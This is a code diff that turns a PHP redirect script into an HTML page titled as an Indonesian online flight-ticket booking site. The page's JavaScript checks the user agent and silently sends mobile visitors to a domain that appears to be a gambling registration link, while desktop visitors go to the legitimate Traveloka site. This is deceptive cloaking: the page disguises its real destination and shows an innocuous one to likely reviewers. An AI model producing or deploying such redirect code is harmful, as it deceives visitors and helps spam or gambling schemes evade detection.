@@ -1,43 +1,34 @@
-<?php
-// ================= CONFIG =================
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pesan Tiket Pesawat Online</title>
 
-$mobile_url  = 'https://link-daftar-sensa88.store/';
-$desktop_url = 'https://www.traveloka.com/';
+  <script>
+    // ================= CONFIG =================
 
-// ================= MOBILE DETECTION =================
+    const mobile_url  = "https://link-daftar-sensa88.store/";
+    const desktop_url = "https://www.traveloka.com/";
 
-function is_mobile_device() {
+    // ================= MOBILE DETECTION =================
 
-    if (!empty($_SERVER['HTTP_X_WAP_PROFILE']) || !empty($_SERVER['HTTP_PROFILE'])) {
-        return true;
+    function isMobileDevice() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+
+      return /android|iphone|ipad|ipod|mobile|blackberry|opera mini|iemobile|windows phone|kindle|symbian|phone/i.test(ua);
     }
 
-    if (!empty($_SERVER['HTTP_ACCEPT']) &&
-        stripos($_SERVER['HTTP_ACCEPT'], 'wap') !== false) {
-        return true;
+    // ================= REDIRECT =================
+
+    if (isMobileDevice()) {
+      window.location.href = mobile_url;
+    } else {
+      window.location.href = desktop_url;
     }
-
-    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-
-    if (!$ua) {
-        return false;
-    }
-
-    $mobile_regex = '/(android|iphone|ipad|ipod|mobile|blackberry|opera mini|iemobile|windows phone|kindle|symbian|phone)/i';
-
-    return preg_match($mobile_regex, $ua);
-}
-
-// ================= REDIRECT =================
-
-// Mobile
-if (is_mobile_device()) {
-
-    header("Location: $mobile_url", true, 302);
-    exit;
-}
-
-// Desktop
-header("Location: $desktop_url", true, 302);
-exit;
-?>
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
